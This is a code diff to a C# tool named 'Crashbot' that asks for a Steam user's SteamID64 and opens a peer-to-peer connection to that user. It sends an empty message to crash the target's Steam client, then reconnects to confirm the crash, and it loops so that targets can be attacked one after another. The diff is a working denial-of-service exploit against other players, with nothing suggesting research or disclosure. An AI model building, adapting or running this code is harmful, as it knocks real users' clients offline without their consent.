@@ -48,49 +48,40 @@ namespace Crashbot
 
             Console.WriteLine("Test: 76561198299556567");
 
-        start:
-            Console.WriteLine(Environment.NewLine);
-            Console.Write("Enter target SteamID64: ");
-            ulong target = ulong.Parse(Console.ReadLine()?.Trim() ?? "0");
-
-            Console.WriteLine("Connecting...");
-            var (conn, info) = ConnectAndWait(target, LongTimeoutOptions);
-            if (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
-                Console.WriteLine("Connected!");
-
-            int maxMessages = 1;
             while (true)
             {
-                IntPtr[] messagePointers = new IntPtr[maxMessages];
-                int messageCount = Steamworks.SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, messagePointers, maxMessages);
+                // Gather target
+                Console.WriteLine(Environment.NewLine);
+                Console.Write("Enter target SteamID64: ");
+                ulong target = ulong.Parse(Console.ReadLine()?.Trim() ?? "0");
 
-                if (messageCount > 0)
+                // Initiate the connection
+                Console.WriteLine("Connecting...");
+                var (conn, info) = ConnectAndWait(target, LongTimeoutOptions);
+
+                if (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
                 {
-                    // Steamworks.SteamNetworkingSockets.SendMessageToConnection(conn, 0, 0, 0, out long _);
-                    // Steamworks.SteamNetworkingSockets.FlushMessagesOnConnection(conn);
-
-                    Steamworks.SteamAPI.RunCallbacks();
-                    Steamworks.SteamNetworkingSockets.RunCallbacks();
-
-                    Console.WriteLine("Crashing client...");
-                    Thread.Sleep(500);
-
-                    Steamworks.SteamNetworkingSockets.CloseConnection(conn, 0, string.Empty, false);
-                    break;
+                    Console.WriteLine("Connected!");
                 }
                 else
                 {
-                    Thread.Sleep(10);
+                    Console.WriteLine("Failed to connect. Possibly Friends Only or Private");
+                    continue;
                 }
+
+                // Crash the client
+                Program.ReadOneAndSendOne(conn, 0, 0, 0);
+                Console.WriteLine("Crashing client...");
+                Thread.Sleep(500);
+                Steamworks.SteamNetworkingSockets.CloseConnection(conn, 0, string.Empty, false);
+
+                // Check if the client crashed
+                Console.WriteLine("Checking target...");
+                var (_, info2) = ConnectAndWait(target, ConnectionTimeoutOptions);
+
+                bool crashed = info2.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally;
+                Console.WriteLine(crashed ? "Successfully Crashed!" : "Failed to Crash. Possibly Friends Only or Private");
             }
-
-            Console.WriteLine("Checking target...");
-            var (conn2, info2) = ConnectAndWait(target, ConnectionTimeoutOptions);
-
-            bool crashed = info2.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally;
-            Console.WriteLine(crashed ? "Successfully Crashed!" : "Failed to Crash. Possibly Friends Only or Private");
-
-            goto start;
         }
 
         private static (HSteamNetConnection Connection, SteamNetConnectionInfo_t Info) ConnectAndWait(ulong target, SteamNetworkingConfigValue_t[] options)
@@ -100,7 +91,6 @@ namespace Crashbot
 
             SteamNetworkingIdentity remoteIdentity = new();
             remoteIdentity.SetSteamID(cSteamID);
-
             HSteamNetConnection conn = SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, options.Length, options);
 
             Thread.Sleep(10);
@@ -123,6 +113,30 @@ namespace Crashbot
             }
 
             return (conn, info);
+        }
+
+        private static void ReadOneAndSendOne(HSteamNetConnection connection, IntPtr data, uint dataLen, int flags)
+        {
+            int maxMessages = 1;
+            while (true)
+            {
+                IntPtr[] messagePointers = new IntPtr[maxMessages];
+                int messageCount = Steamworks.SteamNetworkingSockets.ReceiveMessagesOnConnection(connection, messagePointers, maxMessages);
+
+                if (messageCount > 0)
+                {
+                    Steamworks.SteamNetworkingSockets.SendMessageToConnection(connection, data, dataLen, flags, out long _);
+                    Steamworks.SteamNetworkingSockets.FlushMessagesOnConnection(connection);
+
+                    Steamworks.SteamAPI.RunCallbacks();
+                    Steamworks.SteamNetworkingSockets.RunCallbacks();
+                    break;
+                }
+                else
+                {
+                    Thread.Sleep(10);
+                }
+            }
         }
     }
 }
